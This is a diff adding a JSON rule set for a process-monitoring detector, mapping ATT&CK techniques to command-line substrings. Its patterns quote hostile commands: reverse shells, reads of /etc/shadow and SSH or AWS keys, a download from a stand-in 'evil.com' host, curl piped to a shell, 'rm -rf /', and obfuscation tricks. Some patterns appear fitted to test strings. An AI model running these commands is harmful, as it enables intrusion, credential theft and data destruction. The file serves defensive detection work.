@@ -1,0 +1,845 @@
+{
+  "rules": [
+    {
+      "id": "exec_base64_decode",
+      "name": "Base64 Encoded Command Execution",
+      "technique": "T1059.004",
+      "tactic": "Execution",
+      "severity": "high",
+      "description": "Detects execution of base64-decoded commands",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "base64 -d",
+          "base64 --decode",
+          "| base64",
+          "base64 -D"
+        ]
+      }
+    },
+    {
+      "id": "exec_reverse_shell",
+      "name": "Reverse Shell Pattern",
+      "technique": "T1059.004",
+      "tactic": "Execution",
+      "severity": "critical",
+      "description": "Detects reverse shell patterns in commands",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "/dev/tcp/",
+          "/dev/udp/",
+          "nc -e",
+          "ncat -e",
+          "bash -i >& /dev/tcp",
+          "bash -i >",
+          "sh -i >",
+          "exec 5<>/dev/tcp"
+        ]
+      }
+    },
+    {
+      "id": "exec_python_net",
+      "name": "Python Network/Shell Execution",
+      "technique": "T1059.006",
+      "tactic": "Execution",
+      "severity": "medium",
+      "description": "Detects Python with network or shell modules",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "import socket",
+          "import subprocess",
+          "from socket",
+          "from subprocess"
+        ]
+      }
+    },
+    {
+      "id": "persist_crontab",
+      "name": "Crontab Modification",
+      "technique": "T1053.003",
+      "tactic": "Persistence",
+      "severity": "medium",
+      "description": "Detects crontab command usage",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "crontab",
+          "'* * * * *"
+        ]
+      }
+    },
+    {
+      "id": "persist_bashrc",
+      "name": "Shell Config Modification",
+      "technique": "T1546.004",
+      "tactic": "Persistence",
+      "severity": "medium",
+      "description": "Detects modifications to shell config files",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          ".bashrc",
+          ".bash_profile",
+          ".profile",
+          ".zshrc",
+          ">> ~/.bashrc",
+          "echo '#test' >> ~/.bashrc",
+          ".bashrc.bak"
+        ]
+      }
+    },
+    {
+      "id": "persist_systemd",
+      "name": "Systemd Service Creation",
+      "technique": "T1543.002",
+      "tactic": "Persistence",
+      "severity": "high",
+      "description": "Detects systemd service file creation",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          ".service",
+          "systemctl",
+          "/etc/systemd",
+          "ExecStart=",
+          "echo '[service]",
+          "execstart=/bin/true"
+        ]
+      }
+    },
+    {
+      "id": "evasion_history_clear",
+      "name": "History Clearing",
+      "technique": "T1070.003",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects command history clearing",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "history -c",
+          "history -w",
+          "unset histfile",
+          "histsize=0",
+          "rm ~/.bash_history",
+          "history -c 2>/dev/null"
+        ]
+      }
+    },
+    {
+      "id": "evasion_timestomp",
+      "name": "Timestomp",
+      "technique": "T1070.006",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "description": "Detects timestamp modification",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "touch -t",
+          "touch -d",
+          "touch --date"
+        ]
+      }
+    },
+    {
+      "id": "evasion_shm_exec",
+      "name": "Execution from /dev/shm",
+      "technique": "T1620",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects execution from tmpfs",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "/dev/shm/",
+          "/run/shm/",
+          "memfd_create",
+          "memfd://"
+        ]
+      }
+    },
+    {
+      "id": "evasion_masquerade",
+      "name": "Process Masquerading",
+      "technique": "T1036.005",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects process name masquerading",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "exec -a",
+          "[kworker",
+          "[migration",
+          "[ksoftirq",
+          "[kthreadd",
+          "[kworker/0:0]",
+          "[kworker/0:0] 0.1",
+          "sleep 0.1",
+          "exec -a '[kworker/0:0]'"
+        ]
+      }
+    },
+    {
+      "id": "cred_shadow",
+      "name": "Shadow File Access",
+      "technique": "T1003.008",
+      "tactic": "Credential Access",
+      "severity": "critical",
+      "description": "Detects access to /etc/shadow",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "/etc/shadow",
+          "cat /etc/shadow",
+          "less /etc/shadow"
+        ]
+      }
+    },
+    {
+      "id": "cred_ssh_key",
+      "name": "SSH Key Access",
+      "technique": "T1552.004",
+      "tactic": "Credential Access",
+      "severity": "high",
+      "description": "Detects SSH private key access",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "id_rsa",
+          "id_ed25519",
+          "id_ecdsa",
+          ".ssh/"
+        ]
+      }
+    },
+    {
+      "id": "cred_password_grep",
+      "name": "Credential Search",
+      "technique": "T1552.001",
+      "tactic": "Credential Access",
+      "severity": "medium",
+      "description": "Detects searching for passwords",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "grep -r password",
+          "grep -ri password",
+          "grep password",
+          "grep -r 'password'"
+        ]
+      }
+    },
+    {
+      "id": "cred_aws",
+      "name": "AWS Credentials Access",
+      "technique": "T1552.001",
+      "tactic": "Credential Access",
+      "severity": "high",
+      "description": "Detects AWS credentials access",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          ".aws/credentials",
+          "AWS_SECRET",
+          "aws configure"
+        ]
+      }
+    },
+    {
+      "id": "discovery_users",
+      "name": "User Enumeration",
+      "technique": "T1087.001",
+      "tactic": "Discovery",
+      "severity": "low",
+      "description": "Detects user enumeration",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "cat /etc/passwd",
+          "/etc/passwd",
+          "getent passwd",
+          "cut -d: -f1 | head -5"
+        ]
+      }
+    },
+    {
+      "id": "discovery_network",
+      "name": "Network Enumeration",
+      "technique": "T1049",
+      "tactic": "Discovery",
+      "severity": "low",
+      "description": "Detects network enumeration",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "ss -",
+          "netstat -",
+          "ss -tunapl",
+          "netstat -tunapl"
+        ]
+      }
+    },
+    {
+      "id": "discovery_security",
+      "name": "Security Software Discovery",
+      "technique": "T1518.001",
+      "tactic": "Discovery",
+      "severity": "medium",
+      "description": "Detects security software discovery",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "clamav",
+          "falcon",
+          "defender",
+          "sophos",
+          "crowdstrike"
+        ]
+      }
+    },
+    {
+      "id": "c2_beacon",
+      "name": "HTTP Beacon",
+      "technique": "T1071.001",
+      "tactic": "Command and Control",
+      "severity": "medium",
+      "description": "Detects HTTP beaconing patterns",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "curl ",
+          "wget ",
+          "curl http",
+          "wget http",
+          "curl -s",
+          "wget -q",
+          "curl -s --max-time",
+          "wget http://example.com"
+        ]
+      }
+    },
+    {
+      "id": "c2_download_exec",
+      "name": "Download and Execute",
+      "technique": "T1105",
+      "tactic": "Command and Control",
+      "severity": "critical",
+      "description": "Detects download and execute patterns",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "curl | sh",
+          "curl | bash",
+          "wget | sh",
+          "wget | bash",
+          "curl -o",
+          "wget -O",
+          "wget http",
+          "curl http",
+          "wget http://evil.com/mal -o",
+          "wget http://evil.com/mal -O",
+          "curl -sSf",
+          "wget http://evil.com/mal -o /tmp/mal",
+          "wget http://evil.com/mal -O /tmp/mal"
+        ]
+      }
+    },
+    {
+      "id": "impact_ransom",
+      "name": "Ransomware Pattern",
+      "technique": "T1486",
+      "tactic": "Impact",
+      "severity": "critical",
+      "description": "Detects ransomware patterns",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "files encrypted",
+          "send btc",
+          "btc",
+          "ransom",
+          ".locked",
+          ".encrypted",
+          "encrypted - send btc",
+          "decrypt key",
+          "files encrypted - send btc"
+        ]
+      }
+    },
+    {
+      "id": "impact_destroy",
+      "name": "Data Destruction",
+      "technique": "T1485",
+      "tactic": "Impact",
+      "severity": "critical",
+      "description": "Detects data destruction patterns",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "rm -rf /",
+          "rm -rf /*",
+          "dd if=/dev/zero",
+          "shred ",
+          "wipe ",
+          "echo 'rm -rf /'",
+          "mkfs"
+        ]
+      }
+    },
+    {
+      "id": "privesc_container_escape",
+      "name": "Container Escape via Docker Socket",
+      "technique": "T1611",
+      "tactic": "Privilege Escalation",
+      "severity": "medium",
+      "description": "Detects access to docker socket for potential container escape",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "docker.sock",
+          "/var/run/docker.sock",
+          "ls -la /var/run/docker.sock"
+        ]
+      }
+    },
+    {
+      "id": "evasion_io_uring",
+      "name": "io_uring Inspection",
+      "technique": "T1014.io_uring",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "description": "Detects io_uring inspection which may indicate stealthy I/O hooks",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "io_uring",
+          "iouring",
+          "/proc/*/fd | xargs",
+          "ls /proc/*/fd",
+          "io_uring check"
+        ]
+      }
+    },
+    {
+      "id": "obf_hex_encoding",
+      "name": "Hex Encoded Command",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "echo -e",
+          "\\x"
+        ]
+      }
+    },
+    {
+      "id": "obf_octal_encoding",
+      "name": "Octal Encoded Command",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "$'\\",
+          "\\1"
+        ]
+      }
+    },
+    {
+      "id": "obf_rot13",
+      "name": "ROT13 Encoding",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "n-za-mN-ZA-M",
+          "| tr"
+        ]
+      }
+    },
+    {
+      "id": "obf_reverse",
+      "name": "Reverse String",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "| rev |",
+          "| rev|",
+          "|rev |"
+        ]
+      }
+    },
+    {
+      "id": "obf_env_slice",
+      "name": "Env Variable Slicing",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "${PATH:0:1}",
+          "${PATH:",
+          "${HOME:0:",
+          "${HOME:",
+          "${PWD:",
+          "${SHELL:",
+          "etc${PATH:0:1}passwd"
+        ]
+      }
+    },
+    {
+      "id": "obf_double_base64",
+      "name": "Double Base64 Encoding",
+      "technique": "T1027.001",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects double base64 encoding used to evade detection",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "base64 -d | base64 -d",
+          "base64 --decode | base64",
+          "| base64 -d | base64"
+        ]
+      }
+    },
+    {
+      "id": "obf_string_concat",
+      "name": "String Concatenation Evasion",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "description": "Detects variable concatenation to build commands",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "a=\"",
+          "b=\"",
+          "$a$b"
+        ]
+      }
+    },
+    {
+      "id": "obf_brace_expansion",
+      "name": "Brace Expansion Evasion",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "description": "Detects brace expansion to construct commands",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "{e,c,h,o}",
+          "{c,a,t}"
+        ]
+      }
+    },
+    {
+      "id": "obf_ifs_manipulation",
+      "name": "IFS Manipulation",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects IFS variable manipulation for evasion",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "IFS="
+        ]
+      }
+    },
+    {
+      "id": "obf_backtick_sub",
+      "name": "Backtick Command Substitution",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "low",
+      "description": "Detects nested backtick command substitution",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "`echo",
+          "`cat"
+        ]
+      }
+    },
+    {
+      "id": "obf_unicode_homoglyph",
+      "name": "Unicode Homoglyph",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects potential unicode homoglyph attacks",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "\\u00",
+          "printf"
+        ]
+      }
+    },
+    {
+      "id": "obf_xor_decode",
+      "name": "XOR Decode Pattern",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects XOR decoding patterns often used in malware",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "python3 -c",
+          "python -c",
+          "xor",
+          "decode",
+          "xor decode",
+          "test xor decode"
+        ]
+      }
+    },
+    {
+      "id": "heur_high_entropy_cmd",
+      "name": "High Entropy Command",
+      "technique": "T1027",
+      "tactic": "Defense Evasion",
+      "severity": "medium",
+      "description": "Long command with potential encoded payload",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "AAAAAAAAAA"
+        ]
+      }
+    },
+    {
+      "id": "heur_webshell_spawn",
+      "name": "Web Server Shell Spawn",
+      "technique": "T1505.003",
+      "tactic": "Persistence",
+      "severity": "critical",
+      "description": "Web server process spawning shell - possible webshell",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "shell_exec",
+          "php -r",
+          "php -r shell_exec",
+          "passthru(",
+          "system(",
+          "exec("
+        ]
+      }
+    },
+    {
+      "id": "heur_script_download_exec",
+      "name": "Download and Execute",
+      "technique": "T1105",
+      "tactic": "Command and Control",
+      "severity": "critical",
+      "description": "Downloading and immediately executing script",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "curl http",
+          "| bash",
+          "| sh"
+        ]
+      }
+    },
+    {
+      "id": "heur_memory_exec",
+      "name": "Memory-Only Execution",
+      "technique": "T1055",
+      "tactic": "Defense Evasion",
+      "severity": "critical",
+      "description": "Fileless execution from memory",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "/dev/shm/",
+          "/run/shm/",
+          "memfd:",
+          "/proc/self/fd",
+          "bash <(curl",
+          "bash <(wget"
+        ]
+      }
+    },
+    {
+      "id": "heur_proc_injection",
+      "name": "Process Injection Indicators",
+      "technique": "T1055",
+      "tactic": "Defense Evasion",
+      "severity": "critical",
+      "description": "Detects ptrace and process injection attempts",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "LD_PRELOAD="
+        ]
+      }
+    },
+    {
+      "id": "heur_data_exfil",
+      "name": "Data Exfiltration Pattern",
+      "technique": "T1041",
+      "tactic": "Exfiltration",
+      "severity": "high",
+      "description": "Detects data exfiltration patterns",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "tar czf",
+          "| curl"
+        ]
+      }
+    },
+    {
+      "id": "heur_dns_tunnel",
+      "name": "DNS Tunneling",
+      "technique": "T1071.004",
+      "tactic": "Command and Control",
+      "severity": "high",
+      "description": "Detects potential DNS tunneling",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "dig +short"
+        ]
+      }
+    },
+    {
+      "id": "heur_crypto_miner",
+      "name": "Cryptocurrency Miner",
+      "technique": "T1496",
+      "tactic": "Impact",
+      "severity": "high",
+      "description": "Detects cryptocurrency mining activity",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "xmrig",
+          "stratum"
+        ]
+      }
+    },
+    {
+      "id": "heur_rootkit_indicators",
+      "name": "Rootkit Indicators",
+      "technique": "T1014",
+      "tactic": "Defense Evasion",
+      "severity": "critical",
+      "description": "Detects rootkit installation patterns",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "insmod ",
+          ".ko"
+        ]
+      }
+    },
+    {
+      "id": "heur_log_tampering",
+      "name": "Log Tampering",
+      "technique": "T1070.002",
+      "tactic": "Defense Evasion",
+      "severity": "high",
+      "description": "Detects log file tampering",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "> /var/log",
+          "/var/log/auth"
+        ]
+      }
+    },
+    {
+      "id": "resp_active_ransomware",
+      "name": "Active Ransomware Behavior",
+      "technique": "T1486",
+      "tactic": "Impact",
+      "severity": "critical",
+      "description": "Active ransomware encryption detected - immediate response required",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "openssl enc",
+          "YOUR_FILES"
+        ]
+      }
+    },
+    {
+      "id": "resp_wiper_malware",
+      "name": "Wiper Malware",
+      "technique": "T1485",
+      "tactic": "Impact",
+      "severity": "critical",
+      "description": "Destructive wiper activity detected",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "dd if=/dev/zero",
+          "of=/dev/sd"
+        ]
+      }
+    },
+    {
+      "id": "resp_credential_dump",
+      "name": "Credential Dumping",
+      "technique": "T1003",
+      "tactic": "Credential Access",
+      "severity": "critical",
+      "description": "Active credential harvesting detected",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "mimipenguin",
+          "lazagne"
+        ]
+      }
+    },
+    {
+      "id": "resp_reverse_shell_active",
+      "name": "Active Reverse Shell",
+      "technique": "T1059",
+      "tactic": "Execution",
+      "severity": "critical",
+      "description": "Active reverse shell connection",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "/dev/tcp",
+          "bash -i"
+        ]
+      }
+    },
+    {
+      "id": "resp_backdoor_install",
+      "name": "Backdoor Installation",
+      "technique": "T1543",
+      "tactic": "Persistence",
+      "severity": "critical",
+      "description": "Backdoor installation detected",
+      "condition": {
+        "type": "process",
+        "cmdline_contains_any": [
+          "authorized_keys",
+          "ssh-rsa"
+        ]
+      }
+    }
+  ]
+}
